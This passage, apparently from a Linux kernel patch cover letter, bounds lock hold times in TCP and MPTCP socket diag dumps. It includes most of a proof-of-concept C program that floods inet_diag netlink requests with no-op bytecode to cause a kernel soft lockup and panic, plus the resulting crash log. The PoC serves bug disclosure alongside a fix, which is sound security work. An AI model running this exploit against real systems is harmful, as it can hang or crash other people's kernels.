+		size_t attr_len = NLA_HDRLEN + payload_len;
+		struct nlattr *nla = (struct nlattr *)((char *)buf + msg_len);
+		struct inet_diag_bc_op *ops;
+		unsigned int i;
+
+		memset(nla, 0, NLA_ALIGN(attr_len));
+		nla->nla_type = INET_DIAG_REQ_BYTECODE;
+		nla->nla_len = attr_len;
+		ops = (struct inet_diag_bc_op *)((char *)nla + NLA_HDRLEN);
+
+		for (i = 0; i < nops; i++) {
+			ops[i].code = INET_DIAG_BC_NOP;
+			ops[i].yes = sizeof(struct inet_diag_bc_op);
+			ops[i].no = 0;
+		}
+
+		ops[nops].code = INET_DIAG_BC_D_EQ;
+		ops[nops].yes = 2U * sizeof(struct inet_diag_bc_op);
+		ops[nops].no = 3U * sizeof(struct inet_diag_bc_op);
+
+		ops[nops + 1].code = 0;
+		ops[nops + 1].yes = 0;
+		ops[nops + 1].no = 1;
+
+		msg_len += NLA_ALIGN(attr_len);
+		nlh->nlmsg_len = msg_len;
+	}
+
+	return msg_len;
+}
+
+static int recv_until_done(int fd)
+{
+	char *buf;
+	int ret = 0;
+
+	buf = malloc(RECV_BUF_SIZE);
+	if (!buf) {
+		perror("malloc(recv buf)");
+		return -1;
+	}
+
+	for (;;) {
+		ssize_t received = recv(fd, buf, RECV_BUF_SIZE, 0);
+		struct nlmsghdr *nlh;
+		int remaining;
+
+		if (received < 0) {
+			perror("recv");
+			ret = -1;
+			break;
+		}
+
+		if (received == 0) {
+			fprintf(stderr, "recv: unexpected EOF\n");
+			ret = -1;
+			break;
+		}
+
+		remaining = (int)received;
+		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, remaining);
+		     nlh = NLMSG_NEXT(nlh, remaining)) {
+			if (nlh->nlmsg_type == NLMSG_DONE)
+				goto out;
+
+			if (nlh->nlmsg_type == NLMSG_ERROR) {
+				const struct nlmsgerr *err = NLMSG_DATA(nlh);
+
+				if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(*err))) {
+					fprintf(stderr, "short NLMSG_ERROR\n");
+				} else if (err->error) {
+					errno = -err->error;
+					perror("netlink");
+				} else {
+					fprintf(stderr, "unexpected ACK\n");
+				}
+				ret = -1;
+				goto out;
+			}
+		}
+	}
+
+out:
+	free(buf);
+	return ret;
+}
+
+static int run_dump(bool listen_mode, bool with_attack, unsigned int nops,
+		    double *wall_ms)
+{
+	size_t request_len;
+	size_t attr_space = with_attack ?
+			    NLA_ALIGN(NLA_HDRLEN +
+				      ((size_t)nops + 2U) *
+				      sizeof(struct inet_diag_bc_op)) : 0;
+	size_t alloc_len = NLMSG_SPACE(sizeof(struct inet_diag_req_v2)) +
+			   attr_space;
+	struct sockaddr_nl local = {
+		.nl_family = AF_NETLINK,
+	};
+	struct sockaddr_nl kernel = {
+		.nl_family = AF_NETLINK,
+	};
+	struct timeval timeout = {
+		.tv_sec = 60,
+		.tv_usec = 0,
+	};
+	struct iovec iov;
+	struct msghdr msg = {
+		.msg_name = &kernel,
+		.msg_namelen = sizeof(kernel),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+	struct timespec start_ts;
+	struct timespec end_ts;
+	void *request;
+	int fd;
+	int ret = -1;
+
+	request = malloc(alloc_len);
+	if (!request) {
+		perror("malloc(request)");
+		return -1;
+	}
+
+	request_len = build_request(request, listen_mode, with_attack, nops);
+
+	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_SOCK_DIAG);
+	if (fd < 0) {
+		perror("socket(AF_NETLINK)");
+		free(request);
+		return -1;
+	}
+
+	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
+		perror("setsockopt(SO_RCVTIMEO)");
+		goto out;
+	}
+
+	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
+		perror("bind(netlink)");
+		goto out;
+	}
+
+	iov.iov_base = request;
+	iov.iov_len = request_len;
+
+	if (clock_gettime(CLOCK_MONOTONIC_RAW, &start_ts) < 0) {
+		perror("clock_gettime(start)");
+		goto out;
+	}
+
+	if (sendmsg(fd, &msg, 0) < 0) {
+		perror("sendmsg");
+		goto out;
+	}
+
+	if (recv_until_done(fd) < 0)
+		goto out;
+
+	if (clock_gettime(CLOCK_MONOTONIC_RAW, &end_ts) < 0) {
+		perror("clock_gettime(end)");
+		goto out;
+	}
+
+	*wall_ms = (double)timespec_delta_ns(&start_ts, &end_ts) / 1000000.0;
+	ret = 0;
+
+out:
+	close(fd);
+	free(request);
+	return ret;
+}
+
+static int parse_u32(const char *arg, unsigned int *value)
+{
+	char *end = NULL;
+	unsigned long parsed;
+
+	parsed = strtoul(arg, &end, 0);
+	if (!end || *end || parsed > UINT32_MAX)
+		return -1;
+
+	*value = (unsigned int)parsed;
+	return 0;
+}
+
+static int parse_port(const char *arg, int *port)
+{
+	unsigned int value;
+
+	if (parse_u32(arg, &value) < 0 || value > 65535U)
+		return -1;
+
+	*port = (int)value;
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	struct options opts = {
+		.sockets = DEFAULT_SOCKETS,
+		.nops = DEFAULT_NOPS,
+		.repeat = DEFAULT_REPEAT,
+		.groups = DEFAULT_GROUPS,
+		.stride = DEFAULT_STRIDE,
+		.cpu = 0,
+		.cpu_set = false,
+		.compare = false,
+		.attack = true,
+		.listen_mode = true,
+		.port = 0,
+	};
+	int *fds = NULL;
+	int port = 0;
+	unsigned int i;
+
+	for (i = 1; i < (unsigned int)argc; i++) {
+		if (strcmp(argv[i], "--count") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_u32(argv[++i], &opts.sockets) < 0 ||
+			    opts.sockets == 0) {
+				usage(argv[0]);
+				return 1;
+			}
+		} else if (strcmp(argv[i], "--nops") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_u32(argv[++i], &opts.nops) < 0 ||
+			    opts.nops > MAX_NOPS) {
+				fprintf(stderr, "--nops must be in range [0, %u]\n",
+					MAX_NOPS);
+				return 1;
+			}
+		} else if (strcmp(argv[i], "--repeat") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_u32(argv[++i], &opts.repeat) < 0 ||
+			    opts.repeat == 0) {
+				usage(argv[0]);
+				return 1;
+			}
+		} else if (strcmp(argv[i], "--groups") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_u32(argv[++i], &opts.groups) < 0 ||
+			    opts.groups == 0) {
+				usage(argv[0]);
+				return 1;
+			}
+		} else if (strcmp(argv[i], "--stride") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_u32(argv[++i], &opts.stride) < 0 ||
+			    opts.stride == 0) {
+				usage(argv[0]);
+				return 1;
+			}
+		} else if (strcmp(argv[i], "--port") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_port(argv[++i], &opts.port) < 0) {
+				usage(argv[0]);
+				return 1;
+			}
+		} else if (strcmp(argv[i], "--cpu") == 0) {
+			if (i + 1 >= (unsigned int)argc ||
+			    parse_u32(argv[++i], &opts.cpu) < 0) {
+				usage(argv[0]);
+				return 1;
+			}
+			opts.cpu_set = true;
+		} else if (strcmp(argv[i], "--compare") == 0) {
+			opts.compare = true;
+		} else if (strcmp(argv[i], "--no-attack") == 0) {
+			opts.attack = false;
+		} else if (strcmp(argv[i], "--listen") == 0) {
+			opts.listen_mode = true;
+		} else if (strcmp(argv[i], "--bound") == 0) {
+			opts.listen_mode = false;
+		} else {
+			usage(argv[0]);
+			return 1;
+		}
+	}
+
+	if (opts.groups > UINT32_MAX / opts.sockets) {
+		fprintf(stderr, "socket count overflow\n");
+		return 1;
+	}
+
+	if (raise_nofile_limit((rlim_t)opts.sockets * opts.groups + 64U) < 0)
+		return 1;
+
+	if (opts.cpu_set && pin_to_cpu(opts.cpu) < 0)
+		return 1;
+
+	if (setup_sockets(opts.listen_mode, opts.groups, opts.sockets,
+			  opts.stride, opts.port, &fds, &port) < 0)
+		return 1;
+
+	printf("setup_complete groups=%u sockets_per_group=%u total_sockets=%u base_port=%d stride=%u mode=%s nops=%u repeat=%u compare=%s attack=%s\n",
+	       opts.groups, opts.sockets, opts.groups * opts.sockets,
+	       port, opts.stride, opts.listen_mode ? "listen" : "bound",
+	       opts.nops, opts.repeat,
+	       opts.compare ? "yes" : "no",
+	       opts.attack ? "yes" : "no");
+
+	if (opts.compare) {
+		double wall_ms;
+
+		if (run_dump(opts.listen_mode, false, 0, &wall_ms) < 0) {
+			teardown_sockets(fds, opts.groups * opts.sockets);
+			return 1;
+		}
+		printf("baseline wall_ms=%.3f\n", wall_ms);
+	}
+
+	if (opts.attack) {
+		for (i = 0; i < opts.repeat; i++) {
+			double wall_ms;
+
+			if (run_dump(opts.listen_mode, true, opts.nops, &wall_ms) < 0) {
+				teardown_sockets(fds, opts.groups * opts.sockets);
+				return 1;
+			}
+			printf("attack_run=%u wall_ms=%.3f\n", i + 1, wall_ms);
+		}
+	}
+
+	teardown_sockets(fds, opts.groups * opts.sockets);
+	return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+watchdog: BUG: soft lockup - CPU#1 stuck for 3s! [poc:256]
+[   21.507468] Modules linked in:
+[   21.507471] CPU: 1 UID: 0 PID: 256 Comm: poc Not tainted 7.2.0-rc4-00390-g743916aa8e8c #5 PREEMPT(full)
+[   21.507472] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   21.507473] RIP: 0010:inet_diag_bc_sk (inet_diag.c:471 inet_diag.c:631)
+[   21.507499] Code: 00 00 00 0f 87 89 00 00 00 3c 02 0f 84 4e 01 00 00 3c 03 0f 84 72 01 00 00 3c 01 75 31 0f b7 53 02 29 d5 48 01 d3 85 ed 7e 31 <0f> b6 03 3c 08 76 c2 3c 0b 0f 84 76 01 00 00 77 3a 3c 09 0f 84 54
+All code
+========
+   0:	00 00                	add    %al,(%rax)
+   2:	00 0f                	add    %cl,(%rdi)
+   4:	87 89 00 00 00 3c    	xchg   %ecx,0x3c000000(%rcx)
+   a:	02 0f                	add    (%rdi),%cl
+   c:	84 4e 01             	test   %cl,0x1(%rsi)
+   f:	00 00                	add    %al,(%rax)
+  11:	3c 03                	cmp    $0x3,%al
+  13:	0f 84 72 01 00 00    	je     0x18b
+  19:	3c 01                	cmp    $0x1,%al
+  1b:	75 31                	jne    0x4e
+  1d:	0f b7 53 02          	movzwl 0x2(%rbx),%edx
+  21:	29 d5                	sub    %edx,%ebp
+  23:	48 01 d3             	add    %rdx,%rbx
+  26:	85 ed                	test   %ebp,%ebp
+  28:	7e 31                	jle    0x5b
+  2a:*	0f b6 03             	movzbl (%rbx),%eax		<-- trapping instruction
+  2d:	3c 08                	cmp    $0x8,%al
+  2f:	76 c2                	jbe    0xfffffffffffffff3
+  31:	3c 0b                	cmp    $0xb,%al
+  33:	0f 84 76 01 00 00    	je     0x1af
+  39:	77 3a                	ja     0x75
+  3b:	3c 09                	cmp    $0x9,%al
+  3d:	0f                   	.byte 0xf
+  3e:	84                   	.byte 0x84
+  3f:	54                   	push   %rsp
+
+Code starting with the faulting instruction
+===========================================
+   0:	0f b6 03             	movzbl (%rbx),%eax
+   3:	3c 08                	cmp    $0x8,%al
+   5:	76 c2                	jbe    0xffffffffffffffc9
+   7:	3c 0b                	cmp    $0xb,%al
+   9:	0f 84 76 01 00 00    	je     0x185
+   f:	77 3a                	ja     0x4b
+  11:	3c 09                	cmp    $0x9,%al
+  13:	0f                   	.byte 0xf
+  14:	84                   	.byte 0x84
+  15:	54                   	push   %rsp
+[   21.507500] RSP: 0018:ffffbb290036b7a8 EFLAGS: 00000202
+[   21.507501] RAX: 0000000000000000 RBX: ffff98bcf7ca2588 RCX: 0000000000000000
+[   21.507502] RDX: 0000000000000004 RSI: ffff98bcf7ca0048 RDI: ffff98bcf61c9840
+[   21.507502] RBP: 000000000000dabc R08: 0000000000000000 R09: ffff98bcdfb91440
+[   21.507502] R10: 0000000000000000 R11: ffff98bcdfb91444 R12: 0000000000000000
+[   21.507503] R13: 0000000000002f10 R14: 0000000000000000 R15: 0000000000000002
+[   21.507508] FS:  0000000002be8380(0000) GS:ffff98bda3b6e000(0000) knlGS:0000000000000000
+[   21.507509] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   21.507510] CR2: 00007f62b3bb9000 CR3: 000000000c6b6005 CR4: 0000000000370ef0
+[   21.507510] Call Trace:
+[   21.507512]  <TASK>
+[   21.507512]  ? inet_diag_bc_sk (inet_diag.c:632)
+[   21.507514]  tcp_diag_dump (tcp_diag.c:366)
+[   21.507524]  ? ___slab_alloc (slub.c:1080 slub.c:4524)
+[   21.507526]  ? __kmalloc_node_track_caller_noprof (slub.c:4936 slub.c:5361 slub.c:5497)
+[   21.507527]  ? inet_diag_handler_cmd (netlink.h:341 inet_diag.c:983)
+[   21.507528]  ? __alloc_skb (skbuff.c:715)
+[   21.507531]  ? kmalloc_reserve (skbuff.c:637 (discriminator 1))
+[   21.507532]  __inet_diag_dump (inet_diag.c:823)
+[   21.507533]  netlink_dump (af_netlink.c:2331)
+[   21.507543]  __netlink_dump_start (af_netlink.c:2446)
+[   21.507544]  inet_diag_handler_cmd (netlink.h:341 inet_diag.c:983)
+[   21.507545]  ? __pfx_inet_diag_dump_start (inet_diag.c:891)
+[   21.507546]  ? __pfx_inet_diag_dump (inet_diag.c:928)
+[   21.507547]  ? __pfx_inet_diag_dump_done (inet_diag.c:508)
+[   21.507548]  sock_diag_rcv_msg (sock_diag.c:248 sock_diag.c:284)
+[   21.507550]  ? __pfx_sock_diag_rcv_msg (sock_diag.c:306)
+[   21.507551]  netlink_rcv_skb (af_netlink.c:2556)
+[   21.507553]  netlink_unicast (af_netlink.c:1319 af_netlink.c:1345)
+[   21.507554]  netlink_sendmsg (af_netlink.c:1900)
+[   21.507556]  ____sys_sendmsg (socket.c:775 (discriminator 1) socket.c:790 (discriminator 1) socket.c:2684 (discriminator 1))
+[   21.507558]  ___sys_sendmsg (socket.c:2738)
+[   21.507559]  __sys_sendmsg (socket.c:2770)
+[   21.507560]  do_syscall_64 (syscall_64.c:63 syscall_64.c:94)
+[   21.507563]  entry_SYSCALL_64_after_hwframe (entry_64.S:121)
+[   21.507564] RIP: 0033:0x421964
+[   21.507566] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 f3 0f 1e fa 80 3d fd 26 09 00 00 74 13 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
+All code
+========
+   0:	c2 c0 ff             	ret    $0xffc0
+   3:	ff                   	(bad)
+   4:	ff f7                	push   %rdi
+   6:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
+   a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
+  11:	eb b5                	jmp    0xffffffffffffffc8
+  13:	0f 1f 00             	nopl   (%rax)
+  16:	f3 0f 1e fa          	endbr64
+  1a:	80 3d fd 26 09 00 00 	cmpb   $0x0,0x926fd(%rip)        # 0x9271e
+  21:	74 13                	je     0x36
+  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	77 4c                	ja     0x7e
+  32:	c3                   	ret
+  33:	0f 1f 00             	nopl   (%rax)
+  36:	55                   	push   %rbp
+  37:	48 89 e5             	mov    %rsp,%rbp
+  3a:	48 83 ec 20          	sub    $0x20,%rsp
+  3e:	89                   	.byte 0x89
+  3f:	55                   	push   %rbp
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	77 4c                	ja     0x54
+   8:	c3                   	ret
+   9:	0f 1f 00             	nopl   (%rax)
+   c:	55                   	push   %rbp
+   d:	48 89 e5             	mov    %rsp,%rbp
+  10:	48 83 ec 20          	sub    $0x20,%rsp
+  14:	89                   	.byte 0x89
+  15:	55                   	push   %rbp
+[   21.507567] RSP: 002b:00007ffde1d1cfc8 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
+[   21.507568] RAX: ffffffffffffffda RBX: 0000000002bea910 RCX: 0000000000421964
+[   21.507570] RDX: 0000000000000000 RSI: 00007ffde1d1d040 RDI: 0000000000020003
+[   21.507571] RBP: 0000000000020003 R08: 0006b49d20000000 R09: 00007f62b3bb50e8
+[   21.507571] R10: 0000000000000004 R11: 0000000000000202 R12: 00007ffde1d1d110
+[   21.507571] R13: 0000000000003ffc R14: 0000000000010044 R15: 000000000000fffc
+[   21.507572]  </TASK>
+[   21.507573] Kernel panic - not syncing: softlockup: hung tasks
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+changes in v2:
+  - Rebased onto net commit e2a6641e3bfd (2026-08-27).
+  - Corrected the non-listener PoC state mask to TCPF_BOUND_INACTIVE.
+  - Added current-bucket cursor validation for TCP listener, bind, and
+    ehash paths, and for MPTCP listeners, with safe restart on mismatch.
+  - Reject listen/ehash/MPTCP listener cursors unless sk_state still
+    matches the table being walked.
+  - Count TIME_WAIT bind nodes toward the batch limit and resume them via
+    tw_tb2 instead of treating them as inet_connection_sock.
+  - Kept the listener and bound-only TCP Fixes tags; dropped 7e3aab4a9cd7
+    because that commit only converted the existing ehash dump lock type.
+  - Sorted new TCP dump local declarations reverse xmas tree.
+  - Moved INET_DIAG_DUMP_CURSOR_MPTCP_LISTEN into the MPTCP patch.
+  - Read icsk_ulp_data with rcu_dereference() after dropping the MPTCP
+    listener lock.
+  - Refreshed the inline PoC and matching decoded crash log artifacts.
+  - Corrected wording and removed duplicate crash-log provenance text.
+  - Made PoC defaults match unshare -Urn ./poc (4 listener groups).
+  - Clarified crash-log UID 0, cursor fallback restart, and that UDP/RAW
+    diag locks are outside this series.
+  - v1 Link: https://lore.kernel.org/all/cover.1785307984.git.zihanx@nebusec.ai/
+
+Zihan Xi (2):
+  tcp: diag: bound bucket lock hold in tcp_diag_dump()
+  mptcp: diag: bound listener bucket lock hold
+
+ include/linux/inet_diag.h     |  15 ++
+ include/net/inet_hashtables.h |  18 ++
+ net/ipv4/inet_diag.c          |  13 ++
+ net/ipv4/inet_hashtables.c    |  18 --
+ net/ipv4/tcp_diag.c           | 338 +++++++++++++++++++++++++---------
+ net/mptcp/mptcp_diag.c        | 124 +++++++++----
+ 6 files changed, 383 insertions(+), 143 deletions(-)
+
+-- 
+2.43.0
+
